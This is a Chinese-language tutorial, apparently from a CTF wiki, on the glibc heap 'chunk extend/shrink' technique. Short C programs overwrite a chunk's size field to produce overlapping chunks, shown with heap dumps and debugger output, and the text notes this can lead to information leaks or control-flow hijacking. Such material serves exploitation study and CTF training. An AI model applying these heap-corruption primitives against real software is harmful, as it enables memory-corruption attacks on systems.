.. role:: raw-latex(raw)
   :format: latex
..

chunk extend/shrink
===================

介绍
----

chunk extend是堆上漏洞的一种常见的利用手法，与其他堆漏洞的利用相同，chunk extend:raw-latex:`\shrink攻击同样需要有可以控制malloc`\_chunk的漏洞。这种利用方法需要以下的先决条件：

-  程序中存在基于堆的漏洞
-  漏洞可以使得malloc\_chunk能够被攻击者控制

原理
----

extend 利用之所以能够产生在于ptmalloc(aka glibc)对于malloc\_chunk的各种属性的校验。

在ptmalloc中，获取本chunk块大小的操作如下

::

    /* Get size, ignoring use bits */
    #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))

    /* Like chunksize, but do not mask SIZE_BITS.  */
    #define chunksize_nomask(p) ((p)->mchunk_size)

即取出 malloc\_chunk 中的 size 字段并去除标志位。

在 ptmalloc 中，获取下一 chunk 块地址的操作如下

::

    /* Ptr to next physical malloc_chunk. */
    #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))

即使用当前块指针加上当前块大小。

在ptmalloc中，获取前一个chunk信息的操作如下

::

    /* Size of the chunk below P.  Only valid if prev_inuse (P).  */
    #define prev_size(p) ((p)->mchunk_prev_size)

    /* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
    #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))

即通过malloc\_chunk->prev\_size获取前一块大小，然后使用本chunk地址减去所得大小。

在ptmalloc，判断当前chunk是否是use状态的操作如下：

::

    #define inuse(p)
        ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)

即查看下一chunk的prev\_inuse域，而下一块地址又如我们前面所述是根据当前chunk的size计算得出的。

更多的操作详见\ ``堆相关数据结构``\ 一节。简而言之，extend:raw-latex:`\shrink `chunk利用就是通过对size:raw-latex:`\pre`\_size域进行控制来实现的“放缩”利用。

基本示例1
---------

简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 **注意，我们的示例都是在64位的程序。如果想在32位下进行测试，可以把8字节偏移改为4字节**\ 。

::

    int main(void)
    {
        void *ptr,*ptr1;
        
        ptr=malloc(0x10);//分配第一个0x10的chunk
        malloc(0x10);//分配第二个0x10的chunk
        
        *(long long *)((long long)ptr-0x8)=0x41;//修改第一个块的size域
        
        free(ptr);
        ptr1=malloc(0x30);//实现extend，控制了第二个块的内容
        return 0;
    }

当两个malloc语句执行之后，堆的内存分布如下

::

    0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk 1
    0x602010:   0x0000000000000000  0x0000000000000000
    0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk 2
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000020fc1 <=== top chunk

之后，我们把chunk1的size域更改为0x41，0x41是因为chunk的size域包含了用户控制的大小和header的大小。如上所示正好大小为0x40。在题目中这一步可以由堆溢出得到。

::

    0x602000:   0x0000000000000000  0x0000000000000041 <=== 篡改大小
    0x602010:   0x0000000000000000  0x0000000000000000
    0x602020:   0x0000000000000000  0x0000000000000021
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000020fc1 

执行free之后，我们可以看到chunk2与chunk1合成一个0x40大小的chunk，一起释放了。

::

    Fastbins[idx=0, size=0x10] 0x00
    Fastbins[idx=1, size=0x20] 0x00
    Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 
    Fastbins[idx=3, size=0x40] 0x00
    Fastbins[idx=4, size=0x50] 0x00
    Fastbins[idx=5, size=0x60] 0x00
    Fastbins[idx=6, size=0x70] 0x00

之后我们通过malloc(0x30)得到chunk1+chunk2的块，此时就可以直接控制chunk2中的内容，我们也把这种状态称为overlapping chunk。

::

    call   0x400450 <malloc@plt>
    mov    QWORD PTR [rbp-0x8], rax

    rax = 0x602010

基本示例2
---------

通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的chunk被释放后会被置于unsorted bin链表中。
以下这个示例中，我们使用0x80这个大小来分配堆（作为对比fastbin的范围是0x70）

::

    int main()
    {
        void *ptr,*ptr1;
        
        ptr=malloc(0x80);//分配第一个0x80的chunk1
        malloc(0x10);//分配第二个0x10的chunk2
        malloc(0x10);//防止与top chunk合并
        
        *(int *)((int)ptr-0x8)=0xb1;
        free(ptr);
        ptr1=malloc(0xa0);
    }

在这个例子中，因为分配的size不处于fastbin的范围，因此在释放时如果与top chunk相连会导致和top chunk合并。所以我们需要额外分配一个chunk，把释放的块与top chunk隔开。

::

    0x602000:   0x0000000000000000  0x00000000000000b1 <===chunk1 篡改size域
    0x602010:   0x0000000000000000  0x0000000000000000
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk2
    0x6020a0:   0x0000000000000000  0x0000000000000000
    0x6020b0:   0x0000000000000000  0x0000000000000021 <=== 防止合并的chunk
    0x6020c0:   0x0000000000000000  0x0000000000000000
    0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk

释放后，chunk1把chunk2的内容吞并掉并一起置入unsorted bin

::

    0x602000:   0x0000000000000000  0x00000000000000b1 <=== 被放入unsorted bin
    0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000000  0x0000000000000021
    0x6020a0:   0x0000000000000000  0x0000000000000000
    0x6020b0:   0x00000000000000b0  0x0000000000000020 <=== 注意此处标记为空
    0x6020c0:   0x0000000000000000  0x0000000000000000
    0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk

::

    [+] unsorted_bins[0]: fw=0x602000, bk=0x602000
     →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)

再次进行分配的时候就会取回chunk1和chunk2的空间，此时我们就可以控制chunk2中的内容

::

         0x4005b0 <main+74>        call   0x400450 <malloc@plt>
     →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax
     
         rax : 0x0000000000602010

基本示例3
---------

示例3是在示例2的基础上进行的，这次我们先释放chunk1，然后再修改处于unsorted bin中的chunk1的size域。

::

    int main()
    {
        void *ptr,*ptr1;
        
        ptr=malloc(0x80);//分配第一个0x80的chunk1
        malloc(0x10);//分配第二个0x10的chunk2
        
        free(ptr);//首先进行释放，使得chunk1进入unsorted bin
        
        *(int *)((int)ptr-0x8)=0xb1;
        ptr1=malloc(0xa0);
    }

两次malloc之后的结果如下

::

    0x602000:   0x0000000000000000  0x0000000000000091 <=== chunk 1
    0x602010:   0x0000000000000000  0x0000000000000000
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk 2
    0x6020a0:   0x0000000000000000  0x0000000000000000
    0x6020b0:   0x0000000000000000  0x0000000000020f51

我们首先释放chunk1使它进入unsorted bin中

::

         unsorted_bins[0]: fw=0x602000, bk=0x602000
     →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

    0x602000:   0x0000000000000000  0x0000000000000091 <=== 进入unsorted bin
    0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000090  0x0000000000000020 <=== chunk 2
    0x6020a0:   0x0000000000000000  0x0000000000000000
    0x6020b0:   0x0000000000000000  0x0000000000020f51 <=== top chunk

然后篡改chunk1的size域

::

    0x602000:   0x0000000000000000  0x00000000000000b1 <=== size域被篡改
    0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000090  0x0000000000000020
    0x6020a0:   0x0000000000000000  0x0000000000000000
    0x6020b0:   0x0000000000000000  0x0000000000020f51

此时再进行malloc分配就可以得到chunk1+chunk2的堆块，从而控制了chunk2的内容。

extend heap可以做什么
---------------------

一般来说 extend heap并不能直接控制程序的执行流程。但是因为extend heap可以导致chunk
overlapping，所以我们可以完整的控制这个堆块chunk中的内容。如果chunk存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。如果不存在类似的域也可以通过控制chunk
header中的数据来实现fastbin attack等利用。
